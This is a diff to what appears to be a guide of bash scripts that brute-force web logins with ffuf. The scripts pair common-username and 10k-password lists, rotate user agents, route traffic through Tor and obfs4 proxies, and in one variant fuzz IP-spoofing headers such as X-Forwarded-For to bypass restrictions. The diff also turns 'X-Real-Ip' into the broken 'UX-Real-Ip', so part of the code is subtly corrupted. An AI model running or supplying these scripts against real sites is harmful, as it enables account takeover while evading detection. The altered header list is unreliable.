@@ -51,7 +51,7 @@ if [ $# -lt 1 ]; then
 fi
 
 URL="$1"
-UI="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
+UA="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
 <strong>USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
 </strong>PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
 DEPS="git seclists tor npm nodejs polipo netcat obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"
@@ -177,7 +177,7 @@ if [[ "$METHOD" == "get" ]]; then
     ffuf -u "$FFUF_URL" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
-         -w "$UI:FUZZ3" \
+         -w "$UA:FUZZ3" \
          -x "socks4://127.0.0.1:16379" \
          -X GET \
          -ac -c -r -mc 200 \
@@ -187,7 +187,7 @@ else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
-         -w "$UI:FUZZ3" \
+         -w "$UA:FUZZ3" \
          -x "socks4://127.0.0.1:16379" \
          -X POST -d "$DATA" \
          -ac -c -r -mc 200 \
@@ -233,7 +233,7 @@ if [ $# -lt 1 ]; then
 fi
 
 URL="$1"
-UI="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
+UA="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
 USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
 PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
 DEPS="git seclists tor npm nodejs polipo netcat obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"
@@ -390,7 +390,7 @@ X-Original-Remote-Addr: 127.0.0.1
 X-Original-Url: 127.0.0.1
 X-Proxy-Url: 127.0.0.1
 X-Rewrite-Url: 127.0.0.1
-X-Real-Ip: 127.0.0.1
+UX-Real-Ip: 127.0.0.1
 X-Remote-Addr: 127.0.0.1
 X-Custom-IP-Authorization: 127.0.0.1
 X-Originating-IP: 127.0.0.1
@@ -408,23 +408,25 @@ if [[ "$METHOD" == "get" ]]; then
     ffuf -u "$FFUF_URL" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
-         -w "$UI:FUZZ3" \
+         -w "$UA:FUZZ3" \
          -w "/tmp/forwarded.txt:FUZZ4" \
          -x "socks4://127.0.0.1:16379" \
          -X GET \
          -ac -c -r -mc 200 \
          -H "FUZZ4" \
+         -H "User-Agent:FUZZ3" \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
-         -w "$UI:FUZZ3" \
+         -w "$UA:FUZZ3" \
          -w "/tmp/forwarded.txt:FUZZ4" \
          -x "socks4://127.0.0.1:16379" \
          -X POST -d "$DATA" \
          -ac -c -r -mc 200 \
          -H "FUZZ4" \
+         -H "User-Agent:FUZZ3" \
          "${HEADERS[@]}"
 fi
 ```
@@ -466,7 +468,7 @@ if [ $# -lt 1 ]; then
 fi
 
 URL="$1"
-UI="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
+UA="/usr/share/seclists/Fuzzing/User-Agents/UserAgents.fuzz.txt"
 USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
 PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
 DEPS="git seclists tor npm nodejs polipo netcat obfs4proxy dnsutils bind9-utils haproxy privoxy ffuf"
@@ -591,19 +593,21 @@ if [[ "$METHOD" == "get" ]]; then
     ffuf -u "$FFUF_URL" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
-         -w "$UI:FUZZ3" \
+         -w "$UA:FUZZ3" \
          -x "socks4://127.0.0.1:16379" \
          -X GET \
          -ac -c -r -mc 200 \
+         -H "User-Agent:FUZZ3" \
          "${HEADERS[@]}"
 else
     ffuf -u "$FULL_ACTION" \
          -w "$USERLIST:FUZZ1" \
          -w "$PASSLIST:FUZZ2" \
-         -w "$UI:FUZZ3" \
+         -w "$UA:FUZZ3" \
          -x "socks4://127.0.0.1:16379" \
          -X POST -d "$DATA" \
          -ac -c -r -mc 200 \
+         -H "User-Agent:FUZZ3" \
          "${HEADERS[@]}"
 fi
 ```
